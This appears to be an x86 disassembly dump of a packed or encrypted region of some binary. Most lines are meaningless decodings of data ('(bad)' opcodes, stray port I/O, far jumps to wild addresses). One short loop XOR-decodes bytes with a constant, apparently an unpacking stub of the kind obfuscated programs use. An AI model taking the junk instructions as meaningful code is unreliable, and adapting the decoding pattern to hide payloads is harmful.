  403a1a:	cmp    BYTE PTR [ebx+0x3cfdfac6],dl
  403a20:	aas    
  403a21:	out    0xe0,eax
  403a23:	mov    bh,0x71
  403a25:	(bad)  
  403a26:	hlt    
  403a27:	mov    ss,ebp
  403a29:	lahf   
  403a2a:	(bad)  
  403a2b:	mov    edi,0x4a3ab260
  403a30:	or     BYTE PTR [ebx-0x23a185f2],dl
  403a36:	dec    ebx
  403a37:	xchg   DWORD PTR [ecx],edx
  403a39:	push   ecx
  403a3a:	or     BYTE PTR [ebx+ebx*1-0x13a7c7d0],bl
  403a41:	in     al,0x49
  403a43:	cwde   
  403a44:	adc    al,0xda
  403a46:	(bad)  
  403a47:	in     eax,dx
  403a48:	xchg   edx,eax
  403a49:	mov    edi,DWORD PTR [esi-0x32]
  403a4c:	dec    ecx
  403a4d:	xor    BYTE PTR [ebx],ah
  403a4f:	mov    edx,0x649e347c
  403a54:	loopne 0x4039fc
  403a56:	push   ebx
  403a57:	push   ebp
  403a58:	ss stos DWORD PTR es:[edi],eax
  403a5a:	(bad)  [ebx+0x27]
  403a5d:	sbb    al,0xa9
  403a5f:	jo     0x403a99
  403a61:	int    0xf7
  403a63:	leave  
  403a64:	jb     0x403a5a
  403a66:	(bad)  
  403a67:	icebp  
  403a68:	cmp    al,0x69
  403a6a:	cs inc ebx
  403a6c:	or     ah,BYTE PTR [edx+0x32ee6d8c]
  403a72:	fidivr WORD PTR [ebx+0x3895da2f]
  403a78:	adc    BYTE PTR [edi-0x49],bh
  403a7b:	or     edi,edx
  403a7d:	je     0x403aec
  403a7f:	add    ch,ah
  403a81:	xchg   BYTE PTR [edx],bh
  403a83:	sti    
  403a84:	mov    ebp,0x30e6e59b
  403a89:	push   esi
  403a8a:	xchg   ecx,eax
  403a8b:	fnstsw WORD PTR [edx+edx*2-0x62031392]
  403a92:	or     DWORD PTR [edx+0x351fb69],edi
  403a98:	sar    DWORD PTR [eax+0x3e077407],0xa3
  403a9f:	xchg   esp,eax
  403aa0:	add    al,ch
  403aa2:	fdivrp st(0),st
  403aa4:	int    0x14
  403aa6:	inc    edx
  403aa7:	adc    DWORD PTR [eax-0x73],0x7f
  403aab:	js     0x403a5b
  403aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aae:	jmp    0xc751:0xd9f1144e
  403ab5:	or     DWORD PTR [edx+ebp*2+0x48],edx
  403ab9:	jb     0x403b2a
  403abb:	mov    ebp,0x7daedd23
  403ac0:	out    dx,al
  403ac1:	sahf   
  403ac2:	add    eax,0x7715ec16
  403ac7:	sub    al,dh
  403ac9:	dec    esi
  403aca:	xor    dh,BYTE PTR [ebx-0xe014204]
  403ad0:	cmp    ebp,edi
  403ad2:	mov    dh,0xe5
  403ad4:	es xchg ecx,eax
  403ad6:	dec    ecx
  403ad7:	xor    ch,BYTE PTR [edx]
  403ad9:	out    dx,al
  403ada:	mov    al,0x60
  403adc:	xor    ecx,edi
  403ade:	xchg   ecx,eax
  403adf:	xor    eax,0x410359ed
  403ae4:	je     0x403ac8
  403ae6:	pop    ebp
  403ae7:	fnstcw WORD PTR ds:0xc108a7c0
  403aed:	loop   0x403b3d
  403aef:	mov    al,0x79
  403af1:	fsub   st,st(4)
  403af3:	das    
  403af4:	imul   edx,ebp,0x60455366
  403afa:	int    0x24
  403afc:	mov    ecx,DWORD PTR [edi+esi*4+0x10d5b751]
  403b03:	xor    al,0x40
  403b05:	shr    BYTE PTR [ebx-0x73],cl
  403b08:	pop    ebx
  403b09:	cmp    ecx,ecx
  403b0b:	add    ebx,ecx
  403b0d:	out    dx,eax
  403b0e:	inc    edx
  403b0f:	push   esp
  403b10:	jb     0x403adf
  403b12:	rcr    DWORD PTR [ecx],1
  403b14:	jo     0x403abf
  403b16:	cwde   
  403b17:	inc    ebp
  403b18:	xor    BYTE PTR [esi],dl
  403b1a:	mov    DWORD PTR [esi-0x31],edx
  403b1d:	jle    0x403b9e
  403b1f:	mov    edx,0x876260a2
  403b24:	fdivr  QWORD PTR [edi]
  403b26:	and    esi,DWORD PTR [eax-0xc9fa382]
  403b2c:	xor    BYTE PTR [eax],0x2e
  403b2f:	add    BYTE PTR [esi],bh
  403b31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b32:	dec    ebp
  403b33:	add    bl,bl
  403b35:	jmp    0x403b3b
  403b37:	and    al,0xab
  403b39:	inc    esp
  403b3a:	mov    edx,0x7575f172
  403b3f:	or     DWORD PTR [edi-0x62aa7e56],edi
  403b45:	sbb    ebp,DWORD PTR [ecx+0x9460eba]
  403b4b:	mov    ecx,0x99194909
  403b50:	nop
  403b51:	push   0x74f96126
  403b56:	loop   0x403b15
  403b58:	das    
  403b59:	cmp    al,0xa5
  403b5b:	dec    esp
  403b5c:	cwde   
  403b5d:	push   0x4019ec0d
  403b62:	imul   edx,DWORD PTR [ebp+0xb52d7cc],0xffffff91
  403b69:	pop    ecx
  403b6a:	pop    edi
  403b6b:	scas   eax,DWORD PTR es:[edi]
  403b6c:	add    ecx,0x14dc5f9b
  403b72:	jmp    0x8e44d1fa
  403b77:	dec    ecx
  403b78:	sub    eax,DWORD PTR [esi]
  403b7a:	cld    
  403b7b:	mov    dh,0x75
  403b7d:	aaa    
  403b7e:	retf   0x280f
  403b81:	sbb    BYTE PTR [edi+0x257d5f33],ah
  403b87:	shl    BYTE PTR [edi-0x6f],cl
  403b8a:	xchg   BYTE PTR [ebx+0x78],dl
  403b8d:	out    dx,al
  403b8e:	out    0x63,al
  403b90:	jg     0x403c01
  403b92:	cli    
  403b93:	stc    
  403b94:	xchg   edi,eax
  403b95:	test   al,0x19
  403b97:	mov    esp,0x92cfe9fb
  403b9c:	dec    esp
  403b9d:	push   ss
  403b9e:	leave  
  403b9f:	inc    esp
  403ba0:	xchg   ebp,eax
  403ba1:	test   DWORD PTR [ebx-0x78474b39],edx
  403ba7:	(bad)  
  403ba8:	repz pusha 
  403baa:	mov    bl,BYTE PTR [edi+eiz*4-0x69]
  403bae:	jl     0x403b41
  403bb0:	dec    edi
  403bb1:	outs   dx,DWORD PTR ds:[esi]
  403bb2:	add    BYTE PTR [ecx-0x77],al
  403bb5:	jge    0x403b95
  403bb7:	jecxz  0x403b7c
  403bb9:	icebp  
  403bba:	fwait
  403bbb:	and    eax,0xa1822e13
  403bc0:	inc    eax
  403bc1:	mov    esi,0x4b4028ea
  403bc6:	sub    dl,BYTE PTR [edi+0x40108e91]
  403bcc:	push   ebp
  403bcd:	sbb    bl,BYTE PTR [ecx+0x70]
  403bd0:	xchg   ecx,eax
  403bd1:	add    cl,BYTE PTR [ebx]
  403bd3:	sbb    BYTE PTR [eax+0x6a],bh
  403bd6:	(bad)  
  403bd7:	mov    ah,0x55
  403bd9:	mov    ?,WORD PTR [edx-0x76]
  403bdc:	aaa    
  403bdd:	aam    0x2d
  403bdf:	and    esi,ebx
  403be1:	sbb    ebx,esi
  403be3:	mov    ds:0x4c1af32b,eax
  403be8:	(bad)  [ebx-0x4f]
  403beb:	or     al,0x12
  403bed:	mov    al,ds:0x1164092e
  403bf2:	xchg   BYTE PTR [bx+di-0x42],cl
  403bf6:	mov    cl,BYTE PTR [ecx+0x40]
  403bf9:	sub    dh,BYTE PTR ds:0xbe65183c
  403bff:	repnz xor al,0x13
  403c02:	test   DWORD PTR [esp+edx*8-0xdbf10de],0x60738716
  403c0d:	call   0x41f5:0x5e0c83fa
  403c14:	adc    al,0xa3
  403c16:	jecxz  0x403c91
  403c18:	jae    0x403bf8
  403c1a:	call   0xdbf9394d
  403c1f:	sub    cl,BYTE PTR [edi]
  403c21:	inc    ebp
  403c22:	jecxz  0x403c4c
  403c24:	test   BYTE PTR ds:0x7809d81a,al
  403c2a:	stos   DWORD PTR es:[edi],eax
  403c2b:	lock int3 
  403c2d:	pop    esi
  403c2e:	stos   DWORD PTR es:[edi],eax
  403c2f:	inc    esp
  403c30:	enter  0x9b8f,0xd4
  403c34:	pop    ecx
  403c35:	test   BYTE PTR [esi+esi*2],cl
  403c38:	in     eax,0x88
  403c3a:	stc    
  403c3b:	clc    
  403c3c:	push   edx
  403c3d:	xchg   esi,eax
  403c3e:	ins    BYTE PTR es:[edi],dx
  403c3f:	push   cs
  403c40:	push   ecx
  403c41:	pop    es
  403c42:	aad    0x44
  403c44:	fcmovne st,st(3)
  403c46:	hlt    
  403c47:	pusha  
  403c48:	bound  eax,QWORD PTR [ecx-0x9]
  403c4b:	mov    ds:0x3651d78e,eax
  403c50:	xchg   esp,eax
  403c51:	cld    
  403c52:	arpl   WORD PTR ds:0xb45e4acf,di
  403c58:	outs   dx,DWORD PTR ds:[esi]
  403c59:	mov    ebp,0x6eb8c2e6
  403c5e:	push   ebx
  403c5f:	shr    esi,0x40
  403c62:	pop    ebx
  403c63:	mov    al,0xf2
  403c65:	mov    dh,0x80
  403c67:	push   ss
  403c68:	fcmovnu st,st(3)
  403c6a:	pop    edi
  403c6b:	jecxz  0x403cc2
  403c6d:	dec    DWORD PTR [edi]
  403c6f:	loope  0x403c48
  403c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c72:	push   ebp
  403c73:	popf   
  403c74:	hlt    
  403c75:	inc    esp
  403c76:	push   ss
  403c77:	sub    BYTE PTR [esi-0xa08f691],0x97
  403c7e:	in     eax,dx
  403c7f:	loop   0x403c15
  403c81:	test   al,0x42
  403c83:	sub    al,0x87
  403c85:	xchg   ecx,eax
  403c86:	in     eax,dx
  403c87:	mov    DWORD PTR [ebx-0x42],ecx
  403c8a:	(bad)  
  403c8b:	call   0x9ca2f7aa
  403c90:	sbb    al,0x66
  403c92:	repz and DWORD PTR [edx-0x5ed3a783],edi
  403c99:	mov    DWORD PTR [esi+0x7742ca31],edx
  403c9f:	inc    eax
  403ca0:	shl    DWORD PTR [esi+0x3],1
  403ca3:	(bad)  
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0xd9851d1e
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403cf7
  403cf7:	call   0xed34:0xab75a57d
  403cfe:	xchg   esp,eax
  403cff:	and    al,0xa0
  403d01:	loope  0x403d21
  403d03:	mov    BYTE PTR [ebx+ecx*8-0x6d],ah
  403d07:	sbb    eax,0x111fa552
  403d0c:	lea    edx,[edx]
  403d0e:	cld    
  403d0f:	push   es
  403d10:	mov    eax,0xe7f4708c
  403d15:	sbb    al,0x6d
  403d17:	(bad)  
  403d18:	cmc    
  403d19:	fstp   DWORD PTR [eax+0x38]
  403d1c:	jnp    0x403d91
  403d1e:	(bad)  [ecx+ebx*4+0x79cc5037]
  403d25:	idiv   DWORD PTR [edi+0x6c]
  403d28:	mov    cl,0x7e
  403d2a:	jmp    0x403cb4
  403d2c:	test   al,0x72
  403d2e:	xor    dh,0x8e
  403d31:	adc    al,0x7d
  403d33:	push   edi
  403d34:	xadd   BYTE PTR [ebp-0xde4ca51],dh
  403d3b:	sbb    al,0x2e
  403d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d3e:	test   BYTE PTR [edx-0x46],dl
  403d41:	(bad)  
  403d42:	pop    ebx
  403d43:	test   al,0x33
  403d45:	pop    esi
  403d46:	or     BYTE PTR [ebx+0x67c78dd0],dh
  403d4c:	mov    al,ds:0x697f0195
  403d51:	cmp    edx,esi
  403d53:	push   cs
  403d54:	mov    ds:0xf55dddc3,eax
  403d59:	sub    edx,DWORD PTR [eax-0xa]
  403d5c:	adc    eax,0xf6f71c9d
  403d61:	bound  esp,QWORD PTR ds:0x2d076e02
  403d67:	fs jmp 0x403dc2
  403d6a:	pop    esp
  403d6b:	push   ebx
  403d6c:	pmaddwd mm0,QWORD PTR [edx+0x2fb90172]
  403d73:	loopne 0x403dae
  403d75:	mov    ah,0x49
  403d77:	mov    bl,0x32
  403d79:	xlat   BYTE PTR ds:[ebx]
  403d7a:	inc    edx
  403d7b:	or     al,0x9f
  403d7d:	js     0x403d79
  403d7f:	xlat   BYTE PTR ds:[ebx]
  403d80:	xlat   BYTE PTR ds:[ebx]
  403d81:	push   eax
  403d82:	mov    ebx,esi
  403d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d85:	add    ah,cl
  403d87:	stos   BYTE PTR es:[edi],al
  403d88:	fwait
  403d89:	pop    ebx
  403d8a:	cmp    ebp,ebp
  403d8c:	loopne 0x403d64
  403d8e:	cmp    BYTE PTR [ecx],ch
  403d90:	jmp    0x90737279
  403d95:	scas   al,BYTE PTR es:[edi]
  403d96:	out    dx,eax
  403d97:	and    ebp,DWORD PTR [eax+eiz*8]
  403d9a:	inc    edx
  403d9b:	ins    DWORD PTR es:[edi],dx
  403d9c:	push   ds
  403d9d:	adc    al,0x13
  403d9f:	outs   dx,BYTE PTR ds:[esi]
  403da0:	jg     0x403dbd
  403da2:	adc    BYTE PTR [esi],bh
  403da4:	ret    0x4cfd
  403da7:	mov    DWORD PTR [esi+ebx*1-0x78],esp
  403dab:	pop    edi
  403dac:	and    dh,ah
  403dae:	lods   al,BYTE PTR ds:[esi]
  403daf:	pop    eax
  403db0:	pop    es
  403db1:	adc    bl,BYTE PTR ds:0x1f771eed
  403db7:	mov    ebp,0xdf4bf03a
  403dbc:	mov    BYTE PTR [esi],al
  403dbe:	jecxz  0x403d48
  403dc0:	xchg   esp,eax
  403dc1:	push   ebp
  403dc2:	out    0xf3,eax
  403dc4:	pop    edx
  403dc5:	push   cs
  403dc6:	ds lahf 
  403dc8:	test   eax,0xee7d425e
  403dcd:	cmp    ah,BYTE PTR [ebx]
  403dcf:	rol    DWORD PTR [edx-0x24],1
  403dd2:	pop    ebx
  403dd3:	cdq    
  403dd4:	rcl    BYTE PTR [esi],0xd1
  403dd7:	mov    edi,0x80607d4f
  403ddc:	mov    cl,0xc9
  403dde:	leave  
  403ddf:	jge    0x403dcc
  403de1:	(bad)  
  403de2:	lock cli 
  403de4:	ss cs es test eax,0x724fbce
  403dec:	test   BYTE PTR ds:0xe8f5a8a5,ch
  403df2:	rcr    DWORD PTR ss:[edi],cl
  403df5:	lea    ebx,[edi]
  403df7:	loope  0x403ddb
  403df9:	or     esp,DWORD PTR [esp+edx*1-0x43]
  403dfd:	repz out dx,al
  403dff:	xchg   esp,eax
  403e00:	cmp    eax,DWORD PTR [esi-0x4cfbb589]
  403e06:	dec    esp
  403e07:	rcl    BYTE PTR [ecx],cl
  403e09:	xor    ebp,DWORD PTR [ebp+0x66e86df6]
  403e0f:	test   BYTE PTR [eax],al
  403e11:	pop    es
  403e12:	jle    0x403dd6
  403e14:	cmc    
  403e15:	inc    esi
  403e16:	nop
  403e17:	es stos BYTE PTR es:[edi],al
  403e19:	ds inc esi
  403e1b:	idiv   BYTE PTR [esi]
  403e1d:	in     eax,0xd1
  403e1f:	sub    ebp,ecx
  403e21:	mov    ah,0x64
  403e23:	loop   0x403dd2
  403e25:	mov    dl,0xd
  403e27:	mov    WORD PTR [ebx-0x70],?
  403e2a:	jno    0x403ea6
  403e2c:	push   esi
  403e2d:	mov    eax,ds:0xfef2ed21
  403e32:	lods   eax,DWORD PTR ds:[esi]
  403e33:	sbb    BYTE PTR [eax+ecx*2],cl
  403e36:	pop    esp
  403e37:	call   0x15a8:0x7e3aa1e8
  403e3e:	pop    esp
  403e3f:	cmp    al,0xe8
  403e41:	jno    0x403e74
  403e43:	xchg   esi,eax
  403e44:	mov    ebp,0x37f7cb0f
  403e49:	sub    cl,dh
  403e4b:	cmp    cl,BYTE PTR [ebx+esi*2]
  403e4e:	dec    edx
  403e4f:	loope  0x403eb1
  403e51:	xor    ah,ch
  403e53:	ret    
  403e54:	call   FWORD PTR [ebx]
  403e56:	addr16 inc esp
  403e58:	out    dx,eax
  403e59:	lods   al,BYTE PTR ds:[esi]
  403e5a:	pop    ss
  403e5b:	outs   dx,BYTE PTR ds:[esi]
  403e5c:	pop    ss
  403e5d:	call   0x3a4c6cfb
  403e62:	xchg   BYTE PTR [edx],bl
  403e64:	loop   0x403e6b
  403e66:	mov    BYTE PTR [esi-0x81c1f03],bl
  403e6c:	add    eax,0xaf082e97
  403e71:	out    0xb0,al
  403e73:	jg     0x403e30
  403e75:	sub    BYTE PTR [edi+0x57],dh
  403e78:	(bad)  
  403e79:	cmp    eax,0x2fe31e46
  403e7e:	xlat   BYTE PTR ds:[ebx]
  403e7f:	out    dx,eax
  403e80:	arpl   WORD PTR [ebp+0x46],bx
  403e83:	push   esp
  403e84:	add    edx,DWORD PTR [ebp-0x4647b653]
  403e8a:	or     BYTE PTR ds:0xb7dfd9d9,0x4a
  403e91:	popw   ss
  403e93:	repz cmp ah,BYTE PTR [ebx+0x7e41c603]
  403e9a:	into   
  403e9b:	dec    esp
  403e9c:	cdq    
  403e9d:	push   ecx
  403e9e:	sub    cl,bh
  403ea0:	jmp    0xdda618f8
  403ea5:	(bad)  
  403ea6:	adc    al,0x98
  403ea8:	aas    
  403ea9:	in     al,dx
  403eaa:	cli    
  403eab:	ins    DWORD PTR es:[edi],dx
  403eac:	sahf   
  403ead:	pop    esi
  403eae:	loopne 0x403e51
  403eb0:	inc    ebx
  403eb1:	mov    esi,0xa3297793
  403eb6:	jno    0x403e95
  403eb8:	pop    edx
  403eb9:	jecxz  0x403e45
  403ebb:	test   al,0x57
  403ebd:	mov    ah,0x63
  403ebf:	xchg   edx,eax
  403ec1:	or     al,0xef
  403ec3:	mov    bl,0xb
  403ec5:	(bad)  
  403ec6:	mov    WORD PTR [ebx],ds
  403ec8:	pop    ebp
  403ec9:	and    al,0x94
  403ecb:	ret    
  403ecc:	cmp    al,BYTE PTR [ebx]
  403ece:	xchg   ecx,eax
  403ecf:	sar    DWORD PTR [eax-0x11],1
  403ed2:	pop    ebx
  403ed3:	pop    ecx
  403ed4:	dec    esp
  403ed5:	push   esp
  403ed6:	outs   dx,DWORD PTR ds:[esi]
  403ed7:	cdq    
  403ed8:	or     eax,0x4147fe71
  403edd:	xor    ch,dh
  403edf:	jle    0x403ea9
  403ee1:	rcr    dl,0xb7
  403ee4:	mov    al,ds:0x6b21c4b
  403ee9:	mov    bl,BYTE PTR [eax]
  403eeb:	sbb    ebx,DWORD PTR [esi-0x7142ac5]
  403ef1:	ss js  0x403efa
  403ef4:	in     eax,dx
  403ef5:	mov    ebx,0xa0dfcac8
  403efa:	retf   0x227b
  403efd:	lds    esp,FWORD PTR [edx-0x705299ae]
  403f03:	cmp    ebx,edi
  403f05:	push   esi
  403f06:	rcpps  xmm6,XMMWORD PTR [edx+esi*1]
  403f0a:	push   esp
  403f0b:	pop    es
  403f0c:	add    DWORD PTR [esi+ebp*2],edi
  403f0f:	mov    ecx,0x8c809124
  403f14:	nop
  403f15:	pop    ds
  403f16:	shl    esi,cl
  403f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f19:	std    
  403f1a:	lea    esp,[eax]
  403f1c:	inc    ebx
  403f1d:	in     al,dx
  403f1e:	outs   dx,DWORD PTR ds:[esi]
  403f1f:	dec    esi
  403f20:	cld    
  403f21:	jmp    0x3d058880
  403f26:	pop    ds
  403f27:	xchg   edx,eax
  403f28:	mov    ecx,0xeaf79da
  403f2d:	adc    dl,bl
  403f2f:	or     BYTE PTR [edi],bh
  403f31:	add    eax,0x7ee55e85
  403f36:	xchg   esp,eax
  403f37:	push   ebp
  403f38:	addr16 xchg edx,eax
  403f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f3b:	push   0x24
  403f3d:	and    eax,eax
  403f3f:	sub    BYTE PTR [ebx],bl
  403f41:	(bad)  
  403f42:	xchg   edi,eax
  403f43:	in     al,dx
  403f44:	addr16 or al,0xb1
  403f47:	pop    eax
  403f48:	fimul  WORD PTR [edi]
  403f4a:	cli    
  403f4b:	jecxz  0x403f05
  403f4d:	sbb    DWORD PTR [edx],0x76
  403f50:	(bad)  
  403f52:	pushf  
  403f53:	rol    BYTE PTR [ecx],cl
  403f55:	retf   
  403f56:	xor    edi,DWORD PTR [ebp+0x13e1dcd1]
  403f5c:	sbb    edx,DWORD PTR ds:0xb1cc3bb9
  403f62:	aas    
  403f63:	mov    eax,0x1b477a86
  403f68:	mov    WORD PTR [esi],es
  403f6a:	fdiv   DWORD PTR [ecx-0x249c6e36]
  403f70:	mov    edi,0xbc889baf
  403f75:	and    bh,BYTE PTR [ebp-0x6486b81a]
  403f7b:	pop    ecx
  403f7c:	or     cl,BYTE PTR [ebx+0x2]
  403f7f:	imul   esi,DWORD PTR es:[edi+0x3a],0xe695b9e7
  403f87:	xchg   bl,ch
  403f89:	fisub  DWORD PTR [esi-0x1cdbd749]
  403f8f:	or     BYTE PTR ds:0xce1e938c,dh
  403f95:	push   edi
  403f96:	mov    ecx,0xea4a9356
  403f9b:	icebp  
  403f9c:	std    
  403f9d:	pop    esi
  403f9e:	popa   
  403f9f:	dec    esi
  403fa0:	xchg   edx,eax
  403fa1:	dec    edx
  403fa2:	out    dx,eax
  403fa3:	sahf   
  403fa4:	adc    BYTE PTR [esi+0x42],bh
  403fa7:	hlt    
  403fa8:	jle    0x403fb0
  403faa:	xchg   esp,eax
  403fab:	ds imul ecx,DWORD PTR fs:[eax],0x15
  403fb0:	or     BYTE PTR ds:0x6ea9bb39,0x31
  403fb7:	cmp    bh,BYTE PTR [esi]
  403fb9:	call   0x18ae:0x97ee02e4
  403fc0:	scas   al,BYTE PTR es:[edi]
  403fc1:	mov    al,0x8e
  403fc3:	xchg   ebx,eax
  403fc4:	mov    dh,0xd
  403fc6:	out    dx,eax
  403fc7:	sbb    al,0xc2
  403fc9:	in     eax,dx
  403fca:	xchg   ecx,eax
  403fcb:	lods   eax,DWORD PTR ds:[esi]
  403fcc:	fcmove st,st(4)
  403fce:	out    dx,eax
  403fcf:	sbb    eax,0x3c5c5069
  403fd4:	pop    esi
  403fd5:	imul   esi,ecx,0xf57534f2
  403fdb:	jb     0x403fcd
  403fdd:	push   0x5c633232
  403fe2:	mov    cl,0x7c
  403fe4:	fs out 0x1c,eax
  403fe7:	inc    ecx
  403fe8:	in     eax,0xaa
  403fea:	(bad)  
  403feb:	mov    edx,0x4dac2d69
  403ff0:	ror    BYTE PTR [esi+0x38],0xa9
  403ff4:	sbb    al,0x6c
  403ff6:	aam    0x5d
  403ff8:	mov    eax,ds:0x48c4bcd1
  403ffd:	mov    edi,0xce9baaac
  404002:	adc    al,0x5
  404004:	jge    0x404054
  404006:	jl     0x404046
  404008:	scas   al,BYTE PTR es:[edi]
  404009:	jmp    0xbf74a8bf
  40400e:	or     ch,BYTE PTR [ecx+edx*4+0x7d]
  404012:	mov    ds:0x849fb4f5,al
  404017:	icebp  
  404018:	dec    ebp
  404019:	dec    esp
  40401a:	addr16 push 0x1b
  40401d:	bound  ebx,QWORD PTR [eax+0x1b3760be]
  404023:	mov    al,0x9c
  404025:	enter  0x7b79,0x3a
  404029:	or     DWORD PTR [ebp-0x4f6e7680],esi
  40402f:	and    al,0x33
  404031:	mov    esi,0xb9852b41
  404036:	adc    al,0xd1
  404038:	call   0xc04a:0xa27e136b
  40403f:	sub    BYTE PTR [edx-0x7c],0x32
  404043:	push   esp
  404044:	adc    al,0x9d
  404046:	jae    0x403fe4
  404048:	test   BYTE PTR [ebx-0x6a8e9a6b],bh
  40404e:	jo     0x404076
  404050:	mov    al,0xa6
  404052:	icebp  
  404053:	dec    edi
  404054:	fstp   DWORD PTR [eax+ebp*4+0x50]
  404058:	add    dl,bl
  40405a:	mov    bh,0xf6
  40405c:	or     eax,0x345905d3
  404061:	mov    bl,0x33
  404063:	add    al,0x78
  404065:	pop    esp
  404066:	push   0xb
  404068:	and    al,0xf0
  40406a:	les    eax,FWORD PTR [eax-0x6c]
  40406d:	gs mov edx,0xb2a3f19e
  404073:	mov    ebx,0x10b653f2
  404078:	fs jo  0x404051
  40407b:	fnstsw WORD PTR [eax-0x208110f8]
  404081:	xor    DWORD PTR [edi-0x25],eax
  404084:	xlat   BYTE PTR ds:[ebx]
  404085:	pop    esi
  404086:	mov    edi,0xced5a90b
  40408b:	cmc    
  40408c:	mov    ds:0xd5371c62,al
  404091:	sub    DWORD PTR [edx-0x31],ecx
  404094:	out    0x74,al
  404096:	sub    al,0x91
  404098:	mov    esp,0xa3251718
  40409d:	and    edx,DWORD PTR [eax+eiz*8]
  4040a0:	mov    eax,DWORD PTR [edx+0x3d44405d]
  4040a6:	rcl    ch,cl
  4040a8:	lahf   
  4040a9:	loop   0x4040b1
  4040ab:	dec    edx
  4040ac:	hlt    
  4040ad:	mov    bh,BYTE PTR [eax]
  4040af:	mov    bh,0xcf
  4040b1:	shl    DWORD PTR [ebx+ebp*8-0x65d60543],cl
  4040b8:	loope  0x404064
  4040ba:	jmp    DWORD PTR [esi-0x722b881c]
  4040c0:	jns    0x40406d
  4040c2:	or     dh,al
  4040c4:	out    0x32,al
  4040c6:	call   0x46e4:0x84c8dac9
  4040cd:	cmp    eax,0x33f8458b
  4040d2:	rol    DWORD PTR [ebx],0xc6
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax+0x115a34cd],ah
  4040ef:	ss xchg ebx,eax
  4040f1:	sbb    edi,DWORD PTR [esi+0x7e]
  4040f4:	push   esi
  4040f5:	jns    0x404175
  4040f7:	jle    0x4040a1
  4040f9:	iret   
  4040fa:	fstp   DWORD PTR [ebp+eiz*8+0x6b]
  4040fe:	rcr    BYTE PTR [ecx+ecx*2],cl
  404101:	mov    ds:0x1b01ae3a,al
  404106:	xchg   BYTE PTR [edi+eiz*2],al
  404109:	loop   0x40412c
  40410b:	jmp    0x612a:0xd119636b
  404112:	data16 fsub QWORD PTR [ecx+edi*8-0x75]
  404117:	call   0x4cf7fed9
  40411c:	pop    ss
  40411d:	mov    DWORD PTR [eax-0x77f217ba],edx
  404123:	mov    bx,0x83c9
  404127:	call   0x67486a88
  40412c:	jno    0x40417f
  40412e:	sub    al,0xf2
  404130:	rcl    ebp,cl
  404132:	or     BYTE PTR [eax],0x14
  404135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404136:	adc    al,0x2f
  404138:	xchg   edx,eax
  404139:	and    DWORD PTR [edx-0x4c],0xf
  40413d:	sar    BYTE PTR [eax+0x126ac851],cl
  404143:	nop
  404144:	dec    edi
  404145:	jmp    0x4040ed
  404147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404148:	pop    esi
  404149:	outs   dx,DWORD PTR ds:[esi]
  40414a:	in     eax,dx
  40414b:	cli    
  40414c:	jns    0x4041a8
  40414e:	add    BYTE PTR [ecx],ah
  404150:	jns    0x4040e3
  404152:	and    al,0x82
  404154:	scas   eax,DWORD PTR es:[edi]
  404155:	pop    ss
  404156:	mov    ecx,0x6893c7f4
  40415b:	jnp    0x4041b3
  40415d:	jo     0x404133
  40415f:	inc    esp
  404160:	pop    ebp
  404161:	cli    
  404162:	lods   al,BYTE PTR ds:[esi]
  404163:	pushw  ds
  404165:	retf   0xf23
  404168:	es je  0x40413f
  40416b:	dec    esi
  40416c:	mov    edx,0xe83a501a
  404171:	test   ch,al
  404173:	leave  
  404174:	inc    ecx
  404175:	cmp    ah,BYTE PTR [esi]
  404177:	jb     0x404137
  404179:	pop    esi
  40417a:	add    bh,bl
  40417c:	cmp    esi,0xec085273
  404182:	jne    0x40411b
  404184:	push   ebx
  404185:	mov    DWORD PTR ds:0x4f51f89,edx
  40418b:	call   0xc141:0xbdb6590c
  404192:	repnz out dx,eax
  404194:	je     0x404193
  404196:	ror    BYTE PTR [ebp*8-0x1deb758a],1
  40419d:	pop    edi
  40419e:	mov    dh,0xcb
  4041a0:	jmp    0x780d0acd
  4041a5:	xchg   edx,eax
  4041a6:	pop    esp
  4041a7:	out    dx,eax
  4041a8:	fidiv  WORD PTR [edx-0x2f]
  4041ab:	pusha  
  4041ac:	int    0xc1
  4041ae:	push   es
  4041af:	dec    edx
  4041b0:	pop    ebx
  4041b1:	ss adc eax,0x3180128c
  4041b7:	xor    dl,bl
  4041b9:	loope  0x404142
  4041bb:	push   esp
  4041bc:	in     al,0x5a
  4041be:	inc    esi
  4041bf:	std    
  4041c0:	jne    0x404154
  4041c2:	push   ebp
  4041c3:	push   ss
  4041c4:	sbb    DWORD PTR [edx+0x24],edx
  4041c7:	and    DWORD PTR [ebp-0x5b],0xcec9bbba
  4041ce:	loopne 0x40415d
  4041d0:	xor    BYTE PTR fs:[ebx],0x39
